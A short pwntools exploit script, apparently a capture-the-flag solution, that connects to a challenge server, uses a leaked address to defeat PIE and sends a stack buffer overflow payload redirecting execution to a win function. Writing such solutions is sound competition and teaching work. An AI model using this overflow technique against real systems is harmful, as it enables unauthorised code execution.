#!/usr/bin/env python3
from pwn import *

p = remote('chals.vuwctf.com', 9983)

# Parse leaked main address
p.recvuntil(b'funny number: ')
main_leak = int(p.recvline().strip(), 16)

# Calculate win address (PIE bypass)
base = main_leak - 0x12ce
win = base + 0x1229

# Payload: buffer(16) + rbp(8) + win + win
payload = b'A'*16 + b'B'*8 + p64(win) + p64(win)
p.sendline(payload)
p.interactive()
